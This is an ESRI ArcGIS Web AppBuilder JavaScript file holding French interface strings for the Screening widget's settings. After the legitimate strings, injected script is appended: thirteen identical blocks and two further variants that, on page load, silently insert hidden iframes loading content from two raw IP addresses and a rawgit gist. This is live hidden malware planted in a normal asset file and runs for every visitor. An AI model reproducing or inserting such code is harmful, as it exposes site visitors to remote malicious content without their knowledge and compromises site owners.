// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/Screening/setting/nls/strings":{units:{feetUnit:"Pieds/Pieds carr\u00e9s",milesUnit:"Miles/Acres",metersUnit:"M\u00e8tres/M\u00e8tres carr\u00e9s",kilometersUnit:"Kilom\u00e8tres/Kilom\u00e8tres carr\u00e9s",hectaresUnit:"Kilom\u00e8tres/Hectares"},analysisTab:{analysisTabLabel:"Analyse",selectAnalysisLayerLabel:"S\u00e9lectionner des couches d'analyse",addLayerLabel:"Ajouter des couches",noValidLayersForAnalysis:"Couches valides introuvables sur la carte web s\u00e9lectionn\u00e9e.",
noValidFieldsForAnalysis:"Champs valides introuvables sur la carte web s\u00e9lectionn\u00e9e. Supprimez la couche s\u00e9lectionn\u00e9e.",addLayersHintText:"Astuce\u00a0: s\u00e9lectionnez les couches et les champs \u00e0 analyser et afficher dans le rapport",addLayerNameTitle:"Nom de la couche",addFieldsLabel:"Ajouter un champ",addFieldsPopupTitle:"S\u00e9lectionner des champs",addFieldsNameTitle:"Noms de champs",aoiToolsLegendLabel:"Outils AOI",aoiToolsDescriptionLabel:"Activer les outils pour cr\u00e9er des zones d'int\u00e9r\u00eat et sp\u00e9cifier leurs \u00e9tiquettes",
placenameLabel:"Nom de lieu",drawToolsLabel:"Outils de dessin",uploadShapeFileLabel:"Charger un fichier de formes",coordinatesLabel:"Coordonn\u00e9es",coordinatesDrpDwnHintText:"Astuce\u00a0: s\u00e9lectionnez une unit\u00e9 pour afficher les parcours entr\u00e9s",coordinatesBearingDrpDwnHintText:"Astuce\u00a0: s\u00e9lectionnez une orientation pour afficher les parcours entr\u00e9s",allowShapefilesUploadLabel:"Autoriser le chargement des fichiers de formes pour l'analyse",allowShapefilesUploadLabelHintText:'Astuce\u00a0: affichez "Charger un fichier de formes dans Analyse" dans l\'onglet Rapport',
allowVisibleLayerAnalysisLabel:"Ne pas analyser ou signaler les r\u00e9sultats pour les couches qui ne sont pas visibles",allowVisibleLayerAnalysisHintText:"Conseil\u00a0: Les couches qui ont \u00e9t\u00e9 d\u00e9sactiv\u00e9es ou qui ne sont pas visibles en raison des param\u00e8tres de visibilit\u00e9 d\u2019\u00e9chelle ne seront pas analys\u00e9es ou incluses dans les r\u00e9sultats imprim\u00e9s ou t\u00e9l\u00e9charg\u00e9s.",areaUnitsLabel:"Afficher les r\u00e9sultats d\u2019analyse dans",
maxFeatureForAnalysisLabel:"Nombre d'entit\u00e9s maximal pour l'analyse",maxFeatureForAnalysisHintText:"Astuce\u00a0: d\u00e9finissez le nombre d'entit\u00e9s maximal pour l'analyse",searchToleranceLabelText:"Tol\u00e9rance de recherche",searchToleranceHint:"Astuce\u00a0: la tol\u00e9rance de recherche est utilis\u00e9e uniquement lors de l'analyse d'entr\u00e9es de point et de ligne",placenameButtonText:"Nom de lieu",drawToolsButtonText:"Dessin",shapefileButtonText:"Fichier de formes",coordinatesButtonText:"Coordonn\u00e9es",
invalidLayerErrorMsg:"Configurez les champs pour"},downloadTab:{downloadLegend:"Param\u00e8tres de t\u00e9l\u00e9chargement",reportLegend:"Param\u00e8tres du rapport",downloadTabLabel:"T\u00e9l\u00e9charger",syncEnableOptionLabel:"Couches d'entit\u00e9s",syncEnableOptionHint:"Astuce\u00a0: \u00e0 utiliser pour t\u00e9l\u00e9charger les informations des entit\u00e9s croisant la zone d'int\u00e9r\u00eat dans les formats indiqu\u00e9s.",syncEnableOptionNote:"Remarque\u00a0: les services d'entit\u00e9s \u00e0 synchronisation activ\u00e9e sont requis pour l'option G\u00e9odatabase fichier.",
extractDataTaskOptionLabel:"T\u00e2che Exporter les donn\u00e9es du service de g\u00e9otraitement",extractDataTaskOptionHint:"Astuce\u00a0: utilisez une t\u00e2che publi\u00e9e Exporter les donn\u00e9es du service de g\u00e9otraitement pour t\u00e9l\u00e9charger les entit\u00e9s qui croisent la zone d'int\u00e9r\u00eat dans les formats G\u00e9odatabase fichier et Fichier de formes.",cannotDownloadOptionLabel:"D\u00e9sactiver le t\u00e9l\u00e9chargement",syncEnableTableHeaderTitle:{layerNameLabel:"Nom de la couche",
csvFileFormatLabel:"CSV",fileGDBFormatLabel:"G\u00e9odatabase fichier",allowDownloadLabel:"Autoriser le t\u00e9l\u00e9chargement"},setButtonLabel:"D\u00e9finir",GPTaskLabel:"Sp\u00e9cifier l'URL du service de g\u00e9otraitement",printGPServiceLabel:"URL du service d'impression",setGPTaskTitle:"Sp\u00e9cifier l'URL du service de g\u00e9otraitement requise",logoLabel:"Logo",logoChooserHint:"Astuce\u00a0: cliquez sur une ic\u00f4ne d'image pour modifier l'image",footnoteLabel:"Note de bas de page",columnTitleColorPickerLabel:"Couleur des titres de colonnes",
reportTitleLabel:"Titre du rapport",errorMessages:{invalidGPTaskURL:"Service de g\u00e9otraitement non valide. S\u00e9lectionnez un service de g\u00e9otraitement contenant la t\u00e2che Exporter les donn\u00e9es.",noExtractDataTaskURL:"S\u00e9lectionnez un service de g\u00e9otraitement contenant la t\u00e2che Exporter les donn\u00e9es."}},generalTab:{generalTabLabel:"G\u00e9n\u00e9ral",tabLabelsLegend:"Etiquettes de volets",tabLabelsHint:"Astuce\u00a0: sp\u00e9cifiez des \u00e9tiquettes",AOITabLabel:"Volet Zone d'int\u00e9r\u00eat",
ReportTabLabel:"Volet Rapport",bufferSettingsLegend:"Param\u00e8tres de la zone tampon",defaultBufferDistanceLabel:"Distance de la zone tampon par d\u00e9faut",defaultBufferUnitsLabel:"Unit\u00e9s de zone tampon",generalBufferSymbologyHint:"Astuce\u00a0: d\u00e9finissez la symbologie \u00e0 utiliser pour l'affichage des zones tampons autour des zones d'int\u00e9r\u00eat d\u00e9finies",aoiGraphicsSymbologyLegend:"Symbologie des graphiques AOI",aoiGraphicsSymbologyHint:"Astuce\u00a0: d\u00e9finissez la symbologie \u00e0 utiliser lors de la d\u00e9finition des zones d'int\u00e9r\u00eat (point, ligne et polygone)",
pointSymbologyLabel:"Point",previewLabel:"Aper\u00e7u",lineSymbologyLabel:"Ligne",polygonSymbologyLabel:"Polygone",aoiBufferSymbologyLabel:"Symbologie de zone tampon",pointSymbolChooserPopupTitle:"Symbole d\u2019adresse ou d\u2019emplacement",polygonSymbolChooserPopupTitle:"S\u00e9lectionner le symbole pour mettre le polygone en surbrillance",lineSymbolChooserPopupTitle:"S\u00e9lectionner le symbole pour mettre en surbrillance la ligne",aoiSymbolChooserPopupTitle:"D\u00e9finir le symbole de la zone tampon",
aoiTabText:"AOI",reportTabText:"Rapport",invalidSymbolValue:"Valeur de symbole non valide."},searchSourceSetting:{searchSourceSettingTabTitle:"Param\u00e8tres de la source de recherche",searchSourceSettingTitle:"Param\u00e8tres de la source de recherche",searchSourceSettingTitleHintText:"Ajoutez et configurez des services de g\u00e9ocodage ou des couches d\u2019entit\u00e9s en tant que sources de recherche. Ces sources d\u00e9terminent les \u00e9l\u00e9ments pouvant faire l\u2019objet d\u2019une recherche dans la zone de recherche",
addSearchSourceLabel:"Ajouter une source de recherche",featureLayerLabel:"Couche d'entit\u00e9s",geocoderLabel:"G\u00e9ocodeur",generalSettingLabel:"Param\u00e8tre g\u00e9n\u00e9ral",allPlaceholderLabel:"Texte d'espace r\u00e9serv\u00e9 pour tout parcourir\u00a0:",allPlaceholderHintText:"Conseil\u00a0: saisissez le texte \u00e0 afficher en tant qu'espace r\u00e9serv\u00e9 pendant la recherche dans toutes les couches et le g\u00e9ocodeur.",generalSettingCheckboxLabel:"Afficher la fen\u00eatre contextuelle de l'entit\u00e9 ou de l'emplacement trouv\u00e9",
countryCode:"Codes de pays ou de r\u00e9gions",countryCodeEg:"par ex. ",countryCodeHint:"Si cette valeur n'est pas renseign\u00e9e, la recherche s'effectue dans tous les pays et toutes les r\u00e9gions",questionMark:"?",searchInCurrentMapExtent:"Rechercher uniquement dans l'\u00e9tendue de la carte actuelle",zoomScale:"Echelle de zoom",locatorUrl:"URL du g\u00e9ocodeur",locatorName:"Nom du g\u00e9ocodeur",locatorExample:"Exemple",locatorWarning:"Cette version du service de g\u00e9ocodage n'est pas prise en charge. Le widget prend en charge le service de g\u00e9ocodage versions\u00a010.0 et ult\u00e9rieures.",
locatorTips:"Les suggestions ne sont pas disponibles, car le service de g\u00e9ocodage ne prend pas en charge la fonction de suggestion.",layerSource:"Source de la couche",setLayerSource:"D\u00e9finir une source de couche",setGeocoderURL:"D\u00e9finir l'URL du g\u00e9ocodeur",searchLayerTips:"Les suggestions ne sont pas disponibles, car le service d'entit\u00e9s ne prend pas en charge la fonction de pagination.",placeholder:"Texte de l'espace r\u00e9serv\u00e9",searchFields:"Champs de recherche",
displayField:"Champ d'affichage",exactMatch:"Correspondance parfaite",maxSuggestions:"Nombre maximal de suggestions",maxResults:"Nombre maximum de r\u00e9sultats",enableLocalSearch:"Activer la recherche locale",minScale:"Echelle. min.",minScaleHint:"Lorsque l'\u00e9chelle de la carte est sup\u00e9rieure \u00e0 cette \u00e9chelle, la recherche locale est appliqu\u00e9e",radius:"Rayon",radiusHint:"Indique le rayon d'une surface autour du centre de la carte qui permet d'optimiser le classement des candidats de g\u00e9ocodage, afin que les plus proches de l'emplacement soient renvoy\u00e9s en premier",
setSearchFields:"D\u00e9finir les champs de recherche",set:"D\u00e9finir",invalidUrlTip:"L\u2019URL ${URL} est incorrecte ou inaccessible.",invalidSearchSources:"Param\u00e8tres de source de recherche non valides"},errorMsg:{textboxFieldsEmptyErrorMsg:"Renseignez les champs obligatoires",bufferDistanceFieldsErrorMsg:"Entrez des valeurs valides",invalidSearchToleranceErrorMsg:"Entrez une valeur valide pour la tol\u00e9rance de recherche",atLeastOneCheckboxCheckedErrorMsg:"Configuration non valide\u00a0: au moins un outil AOI est requis.",
noLayerAvailableErrorMsg:"Aucune couche disponible",layerNotSupportedErrorMsg:"Pas de prise en charge ",noFieldSelected:"Utilisez l'action de mise \u00e0 jour pour s\u00e9lectionner les champs pour l'analyse.",duplicateFieldsLabels:'Etiquette en double "${labelText}" ajout\u00e9e pour\u00a0: "${itemNames}"',noLayerSelected:"S\u00e9lectionnez au moins une couche pour l'analyse",errorInSelectingLayer:"Impossible de terminer la s\u00e9lection de la couche. Veuillez r\u00e9essayer.",errorInMaxFeatureCount:"Entrez un nombre d'entit\u00e9s maximal valide pour l'analyse."},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});